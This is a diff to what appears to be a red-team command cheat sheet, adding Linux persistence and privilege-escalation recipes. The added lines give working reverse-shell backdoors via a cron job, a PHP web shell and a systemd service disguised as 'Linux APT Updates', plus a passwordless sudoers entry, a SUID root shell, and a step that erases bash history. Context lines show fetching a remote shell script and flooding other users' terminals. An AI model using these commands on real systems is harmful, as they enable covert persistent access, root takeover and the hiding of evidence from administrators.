@@ -69,7 +69,7 @@ FreeBSD:
 fetch 10.10.10.10:9999/shell.py
 ```
 
-Handy Scripts & Commands (Linux):
+Handy Scripts & Commands (Linux) Red/Blue Team Operations:
 
 Monitor processes in real-time *Thanx to Ippsec 
 ```
@@ -143,8 +143,46 @@ Spam all TTY/PTS except yours
 tty
 for i in {2..10}; do cat /dev/urandom > /dev/pts/$i; done
 ```
-Ping Sweeps
+Linux Cron Job Backdoor(Spits out Reverse Shell every 5 mins)
+```
+*/5 * * * * root /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.10/9999 0>&1'
+```
+Malicious PHP Backdoor to trigger reverse shell (/var/www/html/file.php)
+```
+Victim (Create local PHP file with the below contents)
 
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/" . $_GET["ip"] . "/" . $_GET["port"] . " 0>&1'"); ?>
+
+Attacker
+nc -lvnp 9999
+curl 'http://10.10.10.10/file.php?ip=192.168.0.108&port=9999'
+```
+Sudo rights to any user with no password (/etc/sudoers)
+```
+max ALL=(ALL) NOPASSWD:ALL
+```
+Link Bash history to /dev/null
+```
+ln -sf /dev/null ~/.bash_history
+```
+Reverse Shell backdoor via systemd (/etc/systemd/system/updates.service)
+```
+Description=Linux APT Updates.
+
+[Service]
+Type=simple
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/9999 0>&1'
+
+WantedBy=multi-user.target
+```
+Root Shell via C SUID
+```
+echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > priv.c
+gcc priv.c -o shell
+rm priv.c
+chmod +s shell
+/shell
+```
 Linux
 ```
 for i in {1..254}; do ping -c 1 -W 1 10.10.10.$i | grep 'from'; done
